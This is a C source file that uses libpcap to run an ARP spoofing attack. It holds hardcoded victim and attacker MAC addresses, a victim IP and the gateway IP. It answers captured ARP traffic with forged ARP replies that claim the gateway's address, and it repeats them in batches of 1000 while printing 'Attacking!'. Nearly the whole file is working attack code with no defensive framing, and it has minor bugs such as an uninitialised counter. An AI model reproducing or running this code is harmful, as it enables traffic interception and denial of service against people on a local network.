#include "head.h"

pcap_t *handle;
char *INTERFACE; //存储网卡设备
u_char TARGET_MAC[6] = {0xbc,0x9f,0xef,0xd3,0x7b,0xe4}; //victim's mac
u_char SOURCE_MAC[6] = {0x00,0xc2,0xc6,0xb9,0x4d,0x80}; //attacker's mac
u_char TARGET_IP[4] = {192,168,1,115}; //victim's ip
u_char SOURCE_IP[4] = {192,168,1,1}; //gateway's ip
char errbuf[PCAP_ERRBUF_SIZE] = {0}; //存储错误信息

void input_mac(u_char *mac) {
    int i;
    for (i = 0; i < 6; i++) scanf("%hhx", &mac[i]);
}

void input_ip(u_char *ip) {
    int i;
    for (i = 0; i < 4; i++) scanf("%hhd", &ip[i]);
}

void proc_pkt(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
    ethernet_header *pEther;
    arp_header *pArp;
    pEther = (ethernet_header *)packet;
    if (ntohs(pEther->eth_type) == EPT_ARP) {
        //构建伪造ARP帧
        printf("Creating ARP packet\n");
        loading();
        pArp = (arp_header *)pEther->data;
        memcpy(pEther->DST_mac, TARGET_MAC, 6);
        memcpy(pEther->SRC_mac, SOURCE_MAC, 6);
        pEther->eth_type = htons(EPT_ARP);
        pArp->hardware_type = htons(ARPHRD_ETHER);
        pArp->protocol_type = htons(EPT_IPv4);
        pArp->hardware_len = 6;
        pArp->protocol_len = 4;
        pArp->arp_option = htons(ARPOP_REPLY);
        memcpy(pArp->src_mac, SOURCE_MAC, 6);
        memcpy(pArp->src_ip, SOURCE_IP, 4);
        memcpy(pArp->dest_mac, TARGET_MAC, 6);
        memcpy(pArp->dest_ip, TARGET_IP, 4);
        printf("ARP packet created!\n");
        //发送数据包
        printf("Attacking!\n");
        loading();
        int i;
        char choose;
        while(1) {
        if(pcap_sendpacket(handle, (u_char *)pEther, 42) == -1) {
            perror("sendto() failed\n");
            exit(EXIT_FAILURE);
            }
        printf("Packet %d sent.\n", ++i);
        if (i % 1000 == 0) {
            printf("Do you want to send another 1000 packets to your victim? Y/N\n");
            /*getchar();*/
            scanf("%c", &choose);
            if (choose != 'Y' && choose != 'y') break;
            } 
        }
        exit(1);
    }
}

int main(int argc, char const *argv[]) {
    //第一步，初始化攻击资源
    INTERFACE = pcap_lookupdev(errbuf); //返回寻找到的第一个网络设备的指针
    if (INTERFACE == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Device: %s\n", INTERFACE);
    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 60, errbuf);
    pcap_loop(handle, -1, proc_pkt, NULL);
    return 0;
}